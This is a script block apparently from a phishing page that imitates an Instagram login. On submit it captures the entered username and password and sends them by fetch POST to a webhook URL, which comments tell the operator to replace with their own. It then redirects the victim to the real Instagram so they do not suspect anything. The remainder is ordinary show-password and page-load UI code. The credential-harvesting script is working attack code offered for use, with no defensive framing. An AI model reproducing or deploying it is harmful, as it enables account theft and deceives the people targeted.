    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Stop normal submission
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('message').value;
            
            // Send the data to your Webhook/API (e.g., webhook.site)
            // REPLACE THIS URL WITH YOUR OWN WEBHOOK URL
            const WEBHOOK_URL = "https://webhook.site/your-unique-id-here";
            
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                })
            }).catch(err => console.log(err));

            // Instantly redirect to real Instagram so they don't suspect anything
            setTimeout(function () {
                window.location.href = "https://www.instagram.com/";
            }, 500);
        });

        document.addEventListener("DOMContentLoaded", function() {
            const showPasswordBtn = document.getElementById('show-password-btn');
            const passwordField = document.getElementById('message');

            passwordField.addEventListener('input', function () {
                if (passwordField.value.length > 0) {
                    showPasswordBtn.style.display = 'block';
                } else {
                    showPasswordBtn.style.display = 'none';
                }
            });

            showPasswordBtn.addEventListener('click', function () {
                if (passwordField.type === 'password') {
                    passwordField.type = 'text';
                    showPasswordBtn.textContent = 'Hide';
                } else {
                    passwordField.type = 'password';
                    showPasswordBtn.textContent = 'Show';
                }
            });

            window.addEventListener('load', () => {
                setTimeout(() => {
                    document.body.classList.add('loaded');
                }, 800); 
            });
        });
    </script>
